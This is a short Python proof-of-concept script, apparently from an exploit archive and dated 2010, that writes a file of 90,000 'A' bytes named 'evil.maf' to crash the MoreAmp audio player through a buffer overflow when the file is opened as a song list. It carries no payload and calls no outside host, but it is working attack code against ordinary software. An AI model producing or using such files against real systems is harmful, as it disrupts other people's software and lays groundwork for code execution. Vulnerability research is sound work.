@@ -1,0 +1,31 @@
+#!/usr/bin/python
+#
+# Title:                MoreAmp (.maf) Buffer Overflow POC
+# Author:               Sid3^effects aKa HaRi
+# Date:                 June 19th, 2010
+# Platform:             Windows XP sp3 En
+# Thanks to:            r0073r (inj3ct0r.com),L0rd CruSad3r,MaYur,MA1201,gunslinger_
+# greetz to :           All ICW members and my friends :) luv y0 guyz
+#
+# Usage :             File-->Open Song List-->load your evil song list(.maf)        
+
+print "################################################################################"
+print "                         MoreAmp (.maf) Buffer Overflow POC               "
+print "                    By: Sid3^effects                       "
+print "          Usage: File-->Open Song List-->load your evil song list(.maf)        "        
+print "################################################################################"
+
+
+buff = ("\x41" * 90000)
+
+try:
+    f1 = open("evil.maf","w");
+    f1.write(buff);
+    f1.close();
+
+    print "\n MoreAmp (.maf) Buffer Overflow POC"
+    print "\nFile Created Successfully.\n"
+    print "Usage: \n[-] Click File\n[-] Open Song list\n[-] Load you evil file.maf "
+
+except:
+    print "Error."
